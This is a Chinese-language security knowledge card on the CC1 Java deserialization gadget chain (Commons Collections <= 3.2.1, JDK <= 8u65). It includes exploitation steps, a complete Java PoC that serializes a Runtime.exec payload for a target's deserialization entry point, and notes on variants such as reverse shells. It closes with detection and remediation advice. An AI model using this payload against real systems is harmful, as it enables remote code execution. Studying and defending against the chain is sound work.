---
id: web-java-deser-commonscollections-cc1-transformedmap
title: CC1 TransformedMap + AnnotationInvocationHandler 反射链执行命令
type: scenario
domain: web
path: web/java/deserialization
technique: cc1-transformedmap-annotationinvocationhandler
aliases:
- CC1
- TransformedMap 链
- AnnotationInvocationHandler 链
- Commons Collections 1
- InvokerTransformer RCE
tags:
- java
- deserialization
- gadget
- commons-collections
- cc1
- transformedmap
- annotationinvocationhandler
- jdk8
cve: []
severity: high
confidence: high
status: verified
affected_versions: Commons Collections <= 3.2.1；JDK <= 8u65（原文）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V18
  verified_at: '2026-11-05T02:08:51+08:00'
  notes: 已对照原文核对：TransformedMap.checkSetValue→MapEntry.setValue、AnnotationInvocationHandler.readObject 遍历 memberValues、Target.class 仅 value 成员、map key 必须为 value、ChainedTransformer Runtime.exec 链均一致；JDK 8u71+ readObject 改为 LinkedHashMap 导致失效及 CC 3.2.2 限制描述正确；原文明确环境 CC<=3.2.1、JDK<=8u65，affected_versions 已按原文标注
---

## 一句话结论

在 Commons Collections <= 3.2.1 且 JDK <= 8u65 的环境中，用 `AnnotationInvocationHandler.readObject()` 触发 `TransformedMap` 的 `setValue`，再由 `ChainedTransformer`/`InvokerTransformer` 反射调用 `Runtime.exec`，即可在反序列化时执行命令。

## 原理

- `InvokerTransformer.transform(input)` 通过 `input.getClass().getMethod(iMethodName, iParamTypes).invoke(input, iArgs)` 反射调用任意方法；`ChainedTransformer` 顺序执行多个 Transformer，把上一个的返回值作为下一个的输入；`ConstantTransformer` 返回固定常量。
- 典型链：`ConstantTransformer(Runtime.class)` → `InvokerTransformer("getMethod", ...)` 取 `getRuntime` → `InvokerTransformer("invoke", ...)` 得到 Runtime 实例 → `InvokerTransformer("exec", ...)` 执行命令。
- `TransformedMap.checkSetValue(value)` 会调用 `valueTransformer.transform(value)`；`AbstractInputCheckedMapDecorator.MapEntry.setValue()` 会调用父类的 `checkSetValue`，因此对 TransformedMap 的 entry 调用 `setValue` 即可进入 Transformer 链。
- `sun.reflect.annotation.AnnotationInvocationHandler.readObject()` 遍历 `memberValues.entrySet()`，当 key 是注解的合法成员且 value 类型不匹配时调用 `entry.setValue(...)`。用 `Target.class`（只有一个 `ElementType[] value()` 成员）和 map key `"value"` 即可满足“key 是合法成员”；value 填一个非 `ElementType[]` 类型，触发 setValue。
- `TransformedMap.decorate(map, null, chainedTransformer)` 把 value 变换器设为链；最终 `AnnotationInvocationHandler` 作为入口对象被反序列化，命令执行。
- 失效原因：JDK 8u71+ 的 `AnnotationInvocationHandler.readObject` 改为新建 `LinkedHashMap` 并 `put`，不再对原 entry 调用 `setValue`，CC1 断裂；Commons Collections 3.2.2 又在 `InvokerTransformer.readObject` 中调用 `checkUnsafeSerialization` 抛异常。

## 触发条件

- Commons Collections <= 3.2.1（`InvokerTransformer` 可序列化且未被禁用）。
- JDK <= 8u65（`AnnotationInvocationHandler.readObject` 仍会调用 `Map.Entry.setValue`）。
- 目标存在 Java 原生反序列化入口，且未过滤 `sun.reflect.annotation.AnnotationInvocationHandler`、`TransformedMap`、`ChainedTransformer`、`InvokerTransformer` 等类。
- `Runtime.exec` 未被 SecurityManager/策略阻断。

## 利用步骤

1. 构造 Transformer 链：`ConstantTransformer(Runtime.class)` + 三个 `InvokerTransformer`（`getMethod`、`invoke`、`exec`）。
2. 创建 `HashMap`，放入 `"value" -> ""`；用 `TransformedMap.decorate(map, null, chainedTransformer)` 装饰。
3. 反射获取 `sun.reflect.annotation.AnnotationInvocationHandler(Class, Map)` 构造器，`setAccessible(true)`，用 `Target.class` 与装饰后的 Map 实例化。
4. 序列化该 `AnnotationInvocationHandler` 对象。
5. 发送到目标反序列化入口，触发 `readObject` → `setValue` → `ChainedTransformer` → `Runtime.exec`。

## PoC

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CC1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", null}),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, null}),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                new Object[]{"calc"})
        };
        ChainedTransformer chain = new ChainedTransformer(transformers);

        Map<String, Object> inner = new HashMap<>();
        inner.put("value", "");  // Target 注解的成员名必须是 value
        Map decorated = TransformedMap.decorate(inner, null, chain);

        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> ctor = clazz.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object payload = ctor.newInstance(Target.class, decorated);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(payload);
        }
        // 将 bos.toByteArray() 发送到目标反序列化入口
    }
}
```

```text
# 预期：目标反序列化时执行 calc
```

## 变体与关联

- 变体：把 `exec` 换成 `ProcessBuilder`、写入文件、反弹 shell 等；`InvokerTransformer` 可调用任意方法。
- 变体：JDK 8u71+ 改用 CC6（HashMap + TiedMapEntry + LazyMap）或 CC3（动态代理 + LazyMap + InstantiateTransformer）绕过 `AnnotationInvocationHandler` 的修改。
- 变体：Commons Collections 3.2.2 禁用 `InvokerTransformer`/`InstantiateTransformer` 后，需改用应用自带的反射辅助类 + getter 触发（见 CC 3.2.2 绕过卡片）。
- 关联：[[web-java-deser-commonscollections-cc6-cc3-templatesimpl]]（JDK 兼容性更好的组合链）；[[web-java-deser-commonscollections-322-jsonobject-getter-bypass]]（3.2.2 限制下的替代）；[[web-java-deser-commonscollections-cc5-badattribute-tostring]]（另一条 LazyMap 入口）。
- 边界：JDK 8u71+、CC 3.2.2+、JEP 290 过滤器、SecurityManager 限制反射/命令执行时失效。

## 检测与防御

- 检测：序列化流中出现 `AnnotationInvocationHandler`、`TransformedMap`、`ChainedTransformer`、`InvokerTransformer`；反序列化后出现 `Runtime.exec`/子进程；监控 `sun.reflect.annotation` 类的加载。
- 修复：升级 Commons Collections 到 3.2.2+ 并保持 unsafe serialization 关闭；升级 JDK 到 8u71+；消除不可信 Java 原生反序列化。
- 加固：JEP 290 `ObjectInputFilter` 白名单；禁用 `InvokerTransformer`/反射链；对反序列化入口做签名与来源校验。
